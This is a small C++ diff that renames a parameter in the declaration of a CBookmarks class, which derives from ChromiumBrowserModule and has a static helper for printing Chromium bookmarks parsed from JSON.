@@ -13,7 +13,7 @@ using json = nlohmann::json;
 
 class CBookmarks : public ChromiumBrowserModule {
 public:
-    void execute(const fs::path &root, const std::string &name, const fs::path &path) override;
+    void execute(const fs::path &root, const std::string &name, const fs::path &browser_root) override;
 private:
     static void printBookmark(const json &j, std::stringstream &ss);
 };
